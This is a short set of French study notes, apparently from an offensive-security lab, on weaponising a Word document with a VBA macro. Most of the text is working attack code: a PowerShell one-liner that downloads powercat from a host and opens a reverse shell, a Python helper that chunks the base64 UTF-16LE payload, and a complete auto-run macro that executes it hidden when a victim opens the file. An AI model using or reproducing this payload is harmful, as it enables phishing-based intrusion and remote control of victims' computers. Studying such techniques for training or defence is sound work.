docx permet pas de sauvegarder macros
doc ou docm oui

view->macros
Donner un nom, choisir “macros in” à notre document puis create

On veut rouler du code powershell ex:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.239/windows/powercat.ps1');powercat -c 192.168.45.239 -p 4444 -e powershell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Il faut l'encoder en **base64 UTF-16LE**, attention, Linux utilise UTF-8.
VBA a aussi une limite de 250 charactères par string litéraire
Écrire du code Python pour séparer en groupes et concaténer:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ vb
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Auto_Open()
    MyMacro
End Sub

Sub Workbook_Open()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
	Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
	Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
	Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
	Str = Str + "ALgAxADYAOAAuADQANQAuADIAMwA5AC8AdwBpAG4AZABvAHcAc"
	Str = Str + "wAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB"
	Str = Str + "3AGUAcgBjAGEAdAAgAC0AYwAgADEAOQAyAC4AMQA2ADgALgA0A"
	Str = Str + "DUALgAyADMAOQAgAC0AcAAgADQANAA0ADQAIAAtAGUAIABwAG8"
	Str = Str + "AdwBlAHIAcwBoAGUAbABsAA=="

    CreateObject("Wscript.Shell").Run Str
End Sub
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Seulement avoir un utilisateur ouvrir le document